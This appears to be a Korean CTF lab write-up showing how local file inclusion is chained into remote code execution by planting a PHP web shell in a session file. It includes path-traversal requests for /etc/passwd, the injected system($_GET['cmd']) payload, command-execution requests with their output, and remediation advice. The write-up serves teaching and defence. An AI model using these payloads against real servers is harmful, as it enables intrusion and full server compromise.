+++
title = "VulnABLE CTF [LUXORA] Write-up: LFI 🥇 Gold"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "LFI", "Gold", "Session Poisoning", "RCE", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: LFI 🥇 Gold

## 🎯 챌린지 개요
- **카테고리**: File & Resource Layer (LFI to RCE)
- **난이도**: 🥇 Gold
- **타겟 경로**: `/lfi/gold`
- **목표**: 단순한 파일 읽기(LFI) 취약점을 넘어서, 사용자가 통제할 수 있는 파일(Session File)에 악성 PHP 코드를 주입하고 이를 LFI로 실행시켜 원격 코드 실행(RCE)을 달성하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 취약점 분석 (Reconnaissance)

`/lfi/gold` 페이지는 URL의 파라미터를 통해 페이지를 로드합니다.

```http
GET /lfi/gold?page=../../../../etc/passwd HTTP/1.1
```

이전처럼 LFI 취약점이 존재하여 `/etc/passwd` 파일을 읽을 수 있음을 확인했습니다.
이 페이지에는 회원 정보나 장바구니와 같은 세션(Session) 기반 기능이 동작하고 있습니다.

**[해커의 사고 과정]**
1. LFI 취약점이 있다. 파일을 읽을 수 있다.
2. 하지만 단순한 텍스트 파일(passwd)을 읽는 것만으로는 서버를 장악할 수 없다. 코드를 실행(RCE)하고 싶다!
3. 내가 입력한 값을 서버의 어떤 "파일"로 저장시킬 수만 있다면, 그 파일을 LFI로 불러와서(Include) 실행시킬 수 있다.
4. PHP의 **세션(Session) 파일**은 내가 브라우저에 입력한 값(예: 내 사용자 이름 등)을 파일 형태로 저장하는 아주 좋은 먹잇감이다!

---

## 💥 2. 공격 전략 설계 (Exploitation Strategy: Log/Session Poisoning)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(file=../../../../etc/passwd)--> [ Web Server ]
                                                |-- include(../../../../etc/passwd)
<-- Contents of /etc/passwd --------------------|
```


이른바 **LFI to RCE (Session Poisoning)** 공격입니다.

### 💡 PHP 세션 파일의 특징
PHP는 사용자 세션 정보를 `/tmp`, `/var/lib/php/sessions/`, `/var/lib/php5/` 등의 디렉터리에 `sess_[세션ID]` 형태의 파일로 저장합니다.

1. 내 세션 쿠키 값(PHPSESSID)을 확인합니다. (예: `PHPSESSID=abc123xyz`)
2. 내 이름을 변경하는 기능(또는 로그인 폼)에서 이름 란에 **악성 PHP 코드**를 넣습니다.
   - 이름: `<?php system('id'); ?>`
3. 서버는 이 문자열을 `/tmp/sess_abc123xyz` 파일 안에 고스란히 저장합니다.
4. LFI 취약점을 이용하여 `?page=../../../../tmp/sess_abc123xyz` 를 호출합니다.
5. `include()` 함수는 해당 파일을 읽어 들이면서 내부의 `<?php ... ?>` 코드를 텍스트가 아닌 실제 코드로 평가(Evaluate)하여 쉘 명령어를 실행하게 됩니다!

---

## 🚀 3. 공격 수행 및 RCE 달성

### Step 1. 세션 파일에 악성 코드 주입 (Poisoning)
사용자 닉네임을 변경하는 프로필 설정 창(또는 언어 설정 파라미터 등 값을 세션에 저장하는 곳)으로 갑니다.

**[요청: 닉네임 변경]**
```http
POST /profile/update HTTP/1.1
Cookie: PHPSESSID=hacker_session_999

nickname=<?php system($_GET['cmd']); ?>
```
이제 `/tmp/sess_hacker_session_999` 파일 내부 어딘가에 `<?php system($_GET['cmd']); ?>` 라는 코드가 박혀있게 되었습니다.

### Step 2. LFI를 통한 세션 파일 실행 (RCE)
LFI 취약점이 있는 페이지로 가서, 방금 오염시킨 세션 파일을 인클루드하고 `cmd` 파라미터로 실행할 명령어를 전달합니다.

**[요청: LFI + RCE]**
```http
GET /lfi/gold?page=../../../../tmp/sess_hacker_session_999&cmd=ls%20-la HTTP/1.1
```

### 🔍 서버의 응답
서버는 `/tmp/sess_hacker_session_999` 파일을 읽어 실행합니다. 그 안에 들어있던 PHP 코드가 `ls -la` 명령어를 실행하고 결과를 반환합니다.

```text
username: 
total 40
drwxr-xr-x 1 www-data www-data 4096 Oct 10 12:00 .
-rw-r--r-- 1 www-data www-data   34 Oct 10 12:00 flag_lfi_gold.txt
...
(세션 쓰레기 값들...)
```

성공적으로 RCE를 달성했습니다! 이제 플래그를 읽어옵니다.

```http
GET /lfi/gold?page=../../../../tmp/sess_hacker_session_999&cmd=cat%20flag_lfi_gold.txt HTTP/1.1
```

```text
username: FLAG{LFI_🥇_SESSION_POISONING_RCE_X1Y2Z3}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

단순 정보 유출(Information Disclosure) 취약점인 LFI가, 시스템 내부의 임시 파일(Session, Log 등) 쓰기 기능과 결합되었을 때 완벽한 서버 장악(RCE)으로 발전할 수 있는 강력한 체이닝 기법을 실증했습니다.

**🔥 획득한 플래그:**
`FLAG{LFI_🥇_SESSION_POISONING_RCE_X1Y2Z3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
근본적인 방어는 LFI 취약점 자체를 막는 것입니다. 사용자 입력이 파일 시스템 경로로 들어가는 것을 차단해야 합니다.

1. **절대적인 경로 매핑 (Hardcoded Mapping)**: 이전 Silver 단계에서 설명한 것처럼 사용자 입력값을 직접 파일 경로로 쓰지 말고, 정의된 배열의 Key 값으로만 매핑해야 합니다.
2. **세션 파일 위치 보안**: PHP 설정(`php.ini`)에서 세션 저장소(`session.save_path`)를 웹 프로세스가 읽을 수는 있지만 사용자가 임의로 접근 경로를 추측하기 힘든 아주 깊고 무작위화된 디렉터리로 변경합니다.
3. **Log 파일 접근 통제**: 세션뿐만 아니라 Apache/Nginx 접근 로그(`/var/log/apache2/access.log` 등)에도 User-Agent를 조작하여 코드를 주입하는 Log Poisoning이 가능합니다. 이 로그 파일들은 웹 프로세스(www-data)가 읽을 수 없는 권한(root만 읽기)으로 엄격히 제한해야 합니다.